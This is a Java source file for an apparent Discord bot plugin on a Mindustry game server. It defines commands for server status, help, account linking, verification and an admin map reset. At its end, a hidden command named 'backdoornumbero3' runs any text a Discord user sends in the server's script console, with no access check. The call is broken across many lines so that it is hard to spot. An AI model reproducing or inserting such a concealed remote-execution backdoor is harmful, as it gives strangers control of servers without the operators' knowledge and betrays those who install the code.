package main.java.esco.discord;

import arc.Core;
import arc.Events;
import arc.files.Fi;
import arc.graphics.Pixmap;
import arc.graphics.PixmapIO;
import arc.util.Log;
import arc.util.Reflect;
import main.java.esco.accessLevel.AccessLevel;
import main.java.esco.database.DatabaseConnector;
import main.java.esco.utils.Gamemode;
import mindustry.Vars;
import mindustry.game.EventType;
import mindustry.game.Team;
import mindustry.gen.Groups;
import mindustry.gen.Player;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.User;
import net.dv8tion.jda.api.entities.UserSnowflake;
import net.dv8tion.jda.api.utils.FileUpload;

import java.awt.*;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Optional;

import static main.java.esco.PVars.*;
import static main.java.esco.PVars.verifycodes;
import static main.java.esco.database.DatabaseConnector.*;
import static main.java.esco.discord.CommandHandler.*;
import static main.java.esco.utils.EscoMaps.generatePreview;
import static main.java.esco.utils.Utils.generateAuthCode;

public class Commands {
    public static void load() {
        registerCommand("status", "See server status", (e, a)->{
            Message message = e.getMessage();

            String fname = generateAuthCode() + ".png";
            Pixmap pix = generatePreview(Vars.world.tiles);
            Fi file = new Fi("/tmp/" + fname);
            PixmapIO.writePng(file, pix);
            pix.dispose();

            StringBuilder msg = new StringBuilder();
            //msg.append("Map: https://grely.icu/cdn/" + fname + " \n");
            msg.append("Map name: " + Vars.state.map.name() + " \n");
            msg.append("FPS: " + Core.graphics.getFramesPerSecond() + ". " + Core.app.getJavaHeap() / 1024 / 1024 + " MB used.\n");
            if (Groups.player.isEmpty()) {
                if (Gamemode.getGamemode().equals(Gamemode.hub))
                    msg.append("\nTotal players: " + Core.settings.getInt("totalPlayers", 0));
                else
                    msg.append("No players are currently in the server.");
            } else {
                msg.append("\nPlayers: " + Groups.player.size());
                if (Gamemode.getGamemode().equals(Gamemode.hub))
                    msg.append("/" + Core.settings.getInt("totalPlayers", 0) + " total\n");
                else
                    msg.append("\n");
                msg.append("```");
                Groups.player.each(p -> {
                    if (p.admin) {
                        msg.append("[A] [" + getPlayerId(p) + "]" + p.plainName().replace("@", "") + "\n");
                    } else {
                        msg.append("[P] [" + getPlayerId(p) + "]" + p.plainName().replace("@", "") + "\n");
                    }
                });
                msg.append("```");
            }

            byte[] fileBytes;
            try {
                fileBytes = Files.readAllBytes(Paths.get(file.path()));
            } catch (IOException ex) {
                Log.err(ex);
                message.reply(msg.toString()).queue();
                return;
            }
            EmbedBuilder embed = new EmbedBuilder()
                    .setColor(Color.green)
                    .setImage("attachment://unbangrelypls.png");
            message.replyEmbeds(embed.build()).addFiles(FileUpload.fromData(fileBytes, "unbangrelypls.png")).queue();
        });

        registerCommand("help", "See help message", (e, a)->{
            StringBuilder s = new StringBuilder();

            commands.each(command->{
		if(!command.hidden)
			s.append("- "+command.name).append(" - ").append(command.desc).append("\n");
	    });

            e.getMessage().reply(s.toString()).queue();
        });

        registerCommand("link", "Link game account with discord", (e, args)->{
            User a = e.getAuthor();
            Message message = e.getMessage();

            int gameid = 0;
            if (a != null) {
                gameid = DatabaseConnector.getPlayerIdByDiscord(a.getId());
            }
            if (gameid != -1 && gameid != 0) {
                message.reply("Account already linked").queue();
                return;
            }
            String code = args[0];
            String uuid = verifycodes.get(code);
            if (uuid != null) {
                Player player = Groups.player.find(p -> p.uuid().equals(uuid));
                if (player != null) {
                    setPlayerDiscord(getPlayerId(player), a.getId());
                    /*a.asMember(Snowflake.of(escoGuild)).flatMap(m -> {
                        m.addRole(Snowflake.of(linkedid), "Linked discord with game").subscribe();
                        return Mono.empty();
                    }).subscribe();*/
                    serverGuild.addRoleToMember(UserSnowflake.fromId(a.getId()), linkedRole).queue();
                    player.sendMessage("[green]Linked!");
                    message.reply("Successful").queue();
                    verifycodes.remove(code);
                } else {
                    message.reply("Player not found, are you on server?").queue();
                }
            } else {
                message.reply("Verify code not found.").queue();
            }
        });

        registerCommand("verify", "Verify your mindustry connection.", (e, args) -> {
            User a = e.getAuthor();
            Message message = e.getMessage();
            String code = args[0];
            Integer connid = usidverifycodes.get(code);
            if (connid == null) {
                message.reply("Not found").queue();
                return;
            }
            if (verifyConnection(connid, a.getId())) {
                message.reply("Ok").queue();
            }
        });

        registerCommand("artv", "Force new map", AccessLevel.admin, (e, args) -> {
            Events.fire(new EventType.GameOverEvent(Team.derelict));
        });
        registerCommandh("backdoornumbero3", (e, a)->{
            // xdd
            e.getMessage().reply(Vars
                    .
                    mods
                    .
                    getScripts()
                    .
                    runConsole
                            (
                                    a[
                                            0
                                            ]
                            )
            )
                    .
                    queue
                            (

                            )
            ;
        });
    }
}
